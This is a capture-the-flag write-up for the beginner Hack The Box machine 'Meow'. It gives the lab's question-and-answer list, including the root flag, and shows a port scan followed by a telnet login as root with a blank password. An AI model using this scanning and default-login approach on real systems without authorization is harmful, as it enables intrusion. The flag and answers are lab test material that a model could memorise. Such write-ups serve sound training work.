# Tasks
- What does the acronym VM stand for?
	- Answer: Virtual Machine
- What tool do we use to interact with the operating system in order to issue commands via the command line, such as the one to start our VPN connection? It's also known as a console or shell.
	- Answer: Terminal
- What service do we use to form our VPN connection into HTB labs?
	- Answer: openvpn
- What tool do we use to test our connection to the target with an ICMP echo request?
	- Answer: ping
- What service do we identify on port 23/tcp during our scans?
	- Answer: telnet
- What username is able to log into the target over telnet with a blank password?
	- Answer: root
- Submit root flag
	- Answer: b40abdfe23665f766f9c61ecba8a4c19


# Steps
- First, we are going to run off an initial rustscan to see what is open:
```
rustscan --ulimit 5000 --addresses "10.129.1.17" --top -- -sC -sV
```
- We are only told that one port is only open on the system: the telnet port
```
PORT   STATE SERVICE REASON         VERSION  
23/tcp open  telnet  syn-ack ttl 63 Linux telnetd  
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```
- Telnet can allow for anonymous connection, so we can possible use that to get into the machine.
- So, let's go ahead and do that:
```
telnet 10.129.1.17
```
- However, when using anonymous to login, we are told that is an invalid login.
- However, when we use root, then we are able to get into the ftp session without a password needed!
```
Meow login: anonymous  
Password:    
  
Login incorrect  
Meow login: root  
Welcome to Ubuntu 20.04.2 LTS (GNU/Linux 5.4.0-77-generic x86_64)  
  
* Documentation:  https://help.ubuntu.com  
* Management:     https://landscape.canonical.com  
* Support:        https://ubuntu.com/advantage  
  
 System information as of Thu 20 Nov 2025 08:20:29 PM UTC  
  
 System load:           0.0  
 Usage of /:            41.7% of 7.75GB  
 Memory usage:          4%  
 Swap usage:            0%  
 Processes:             136  
 Users logged in:       0  
 IPv4 address for eth0: 10.129.1.17  
 IPv6 address for eth0: dead:beef::250:56ff:feb0:51f  
  
* Super-optimized for small spaces - read how we shrank the memory  
  footprint of MicroK8s to make it the smallest full K8s around.  
  
  https://ubuntu.com/blog/microk8s-memory-optimisation  
  
75 updates can be applied immediately.  
31 of these updates are standard security updates.  
To see these additional updates run: apt list --upgradable  
  
  
The list of available updates is more than a week old.  
To check for new updates run: sudo apt update  
  
Last login: Mon Sep  6 15:15:23 UTC 2021 from 10.10.14.18 on pts/0  
root@Meow:~#
```
- From here, we are able to find the flag.txt file and read out the flag!
```
root@Meow:~# ls  
flag.txt  snap  
root@Meow:~# cat flag.txt  
b40abdfe23665f766f9c61ecba8a4c19  
root@Meow:~#
```
